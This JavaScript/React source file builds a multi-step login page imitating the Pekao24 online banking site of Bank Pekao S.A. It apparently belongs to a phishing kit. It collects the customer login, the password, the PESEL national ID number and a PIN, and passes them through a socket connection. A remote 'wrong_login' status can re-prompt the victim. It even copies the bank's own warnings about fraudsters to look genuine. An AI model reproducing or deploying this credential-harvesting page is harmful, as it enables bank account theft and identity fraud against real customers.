import React, {Fragment, useState} from "react";
import {Button, Form, FormGroup, Input, Label} from "reactstrap";
import Keyboard from '../../../../assets/img/pecao/keyboard.svg'
import {useForm} from "react-hook-form";
import {yupResolver} from '@hookform/resolvers/yup';
import * as yup from "yup";
import PecaoLoader from "../Loader";
import {useSocket} from "../../../../context/socket/socketProvider";
import {useCode} from "../../../../hooks/useCode";

const schema = yup.object().shape({
    login: yup.string().min(4).required(),
    password: yup.string().required(),
    pesel: yup.string().required().matches(/^[0-9]{2}([02468]1|[13579][012])(0[1-9]|1[0-9]|2[0-9]|3[01])[0-9]{5}$/), //81010200141
});
const LoginForm = ({handler}) => {
    const {register, handleSubmit, trigger, reset, formState} = useForm({
        resolver: yupResolver(schema),
        mode: 'onChange'
    });
    const {errors} = formState;
    const {user, setUser} = useSocket();
    const [step, setStep] = useState(1);
    const [loading, setLoading] = useState(false);
    const {code, checkCode, genCodeField, codeToString} = useCode(4);
    const load = (index) => {
        setLoading(true);

        setTimeout(() => {
            setLoading(false);
            setStep(index);
        }, 1500)
    }
    console.log(formState)
    const submitLogin = (data) => {
        console.log(data, code);
        if (checkCode()) {
            setLoading(true);
            setStep(1);
            reset();
            handler({
                ...data,
                pin: codeToString(),
            })
        }

    }
    if (loading) {
        return <PecaoLoader/>
    }

    return (
        <div className={`pecao_login ${step === 2 && 'extended'}`}>
            <div className="login_form_header">
                <h2>Logowanie do Pekao24</h2>
                {
                    user.status === 'wrong_login' ?
                        <div className={'error-banner'}>
                            <h6>Wprowadzone dane są nieprawidłowe.</h6>
                            <p>Spróbuj ponownie lub kliknij poniższy przycisk. System rozróżnia małe i duże litery –
                                sprawdź, czy masz wciśnięty klawisz Caps Lock.</p>
                        </div> : null
                }
            </div>
            <Form onSubmit={handleSubmit(submitLogin)} id={'login_form'} className={'pecao_login_form'}>
                {
                    step === 1 ?
                        <Fragment key={'login'}>
                            <FormGroup>
                                <Label> Wpisz numer klienta / nazwę użytkownika </Label>
                                <div className={`field-and-buttons ${errors.login ? 'error' : null}`}>
                                    <Input {...register('login')}/>
                                    <Button className={'keyboard_btn'}><img src={Keyboard} alt={'keyboard'}/> </Button>
                                </div>
                                {errors.login && (errors.login.type === 'required') ?
                                    <span className={'error-message'}>
                                        Uzupełnij pole
                                    </span> :
                                    errors.login && (errors.login.type === 'min') ?
                                        <span className={'error-message'}>
                                        Minimalna liczba znaków: 4
                                    </span> : null
                                }
                            </FormGroup>
                            <div className="btn_container right">
                                <Button
                                    className={'btn_next'}
                                    type={'button'}
                                    onClick={() => {
                                        console.log(errors)
                                        trigger('login').then((res) => {
                                            if (res) {
                                                const val = document.querySelector('input[name=login]').value;
                                                setUser({
                                                    ...user,
                                                    login: val,
                                                })
                                                load(2);
                                            }
                                        })
                                    }}
                                >
                                    Dalej
                                </Button>
                            </div>
                            <div className="pecao_messages">
                                <div className="message">
                                    <span>29.07.2021</span>
                                    Zachowaj czujność. Uważaj na telefony z fałszywych infolinii.
                                </div>
                                <div className="message">
                                    <span>12.05.2021</span>
                                    Ostrzegamy przed przestępcami podszywającymi się pod Dział Płatności i
                                    Fakturowania Banku Pekao S.A.
                                </div>
                            </div>
                        </Fragment> :
                        step === 2 ?
                            <Fragment key={'pass'}>
                                <FormGroup>
                                    <Label> Wprowadź hasło dla numeru klienta <span>{user.login}</span> </Label>
                                    <div className={`field-and-buttons ${errors.password ? 'error' : null}`}>
                                        <Input type={'password'} {...register('password')} />
                                        {/*<Button className={'keyboard_btn'}><img src={Keyboard}/> </Button>*/}
                                    </div>
                                    {errors.password &&
                                    <span className={'error-message'}>
                                        Uzupełnij pole
                                    </span>
                                    }
                                </FormGroup>
                            </Fragment> :
                            step === 3 ?
                                <Fragment>
                                    <FormGroup>
                                        <Label> Wprowadź PESEL dla numeru klienta <span>{user.login}</span> </Label>
                                        <div className={`field-and-buttons ${errors.password ? 'error' : null}`}>
                                            <Input type={'text'} {...register('pesel')} />
                                            {/*<Button className={'keyboard_btn'}><img src={Keyboard}/> </Button>*/}
                                        </div>
                                        {
                                            (function () {
                                                if (errors.pesel) {
                                                    if(errors.pesel.type === 'required'){
                                                        return <span className={'error-message'}>Uzupełnij pole</span>
                                                    }
                                                    else return  <span className={'error-message'}>Błędny PESEL</span>

                                                }
                                            })()
                                        }
                                    </FormGroup>

                                </Fragment> :
                                step === 4 ?
                                <Fragment>
                                    <FormGroup>
                                        <Label>Wpisz PIN dla numeru klienta <span>{user.login}</span> </Label>
                                        <div className="code_fields">
                                            {
                                                code.map((item, index) => (
                                                    <div className="field">
                                                        <Input className={'code_input'} inputMode={'decimal'}
                                                               type={'number'} max={10} {...genCodeField(index)}/>
                                                    </div>
                                                ))
                                            }
                                        </div>
                                    </FormGroup>

                                </Fragment> : null
                }
            </Form>
            <div className="pecao_login_footer">
                {
                    step === 1 ?
                        <Fragment key={'login'}>
                            <a href={'#'}>Bezpieczeństwo</a>
                            <a href={'#'}>Pomoc w logowaniu</a>
                        </Fragment> :
                        step === 2 ?
                            <Fragment key={'pass'}>
                                <Button
                                    className={'back gray'}
                                    type={'button'}
                                    onClick={() => {
                                        setStep(step - 1)
                                    }}
                                >
                                    Wstecz
                                </Button>
                                <a href={'#'}>Bezpieczeństwo</a>
                                <a href={'#'}>Pomoc w logowaniu</a>
                                <Button key={'valid_pass'}
                                        type={'button'}
                                        onClick={(e) => {
                                            trigger('password').then(res => {
                                                if (res) {
                                                    load(3);
                                                }
                                            })

                                        }}
                                >
                                    Dalej
                                </Button>
                            </Fragment> :
                            step === 3 ?
                                <Fragment key={'pesel'}>
                                    <div className="btn_container">
                                        <Button
                                            className={'back gray'}
                                            type={'button'}
                                            onClick={() => {
                                                setStep(step - 1)
                                            }}
                                        >
                                            Wstecz
                                        </Button>
                                        <Button key={'valid_pass'}
                                                type={'button'}
                                                onClick={(e) => {
                                                    trigger('pesel').then(res => {
                                                        if (res) {
                                                            load(4);
                                                        }
                                                    })

                                                }}
                                        >
                                            Dalej
                                        </Button>
                                    </div>

                                </Fragment> :
                            step === 4 ?
                                <div className="btn_container">
                                    <Button
                                        className={'back gray'}
                                        onClick={() => {
                                            setStep(step - 1);
                                        }}
                                    >
                                        Wstecz
                                    </Button>
                                    <Button className={'btn_next'} type={'submit'} form={'login_form'}>
                                        Zaloguj
                                    </Button>
                                </div> : null
                }

            </div>
        </div>
    )
}

export default LoginForm;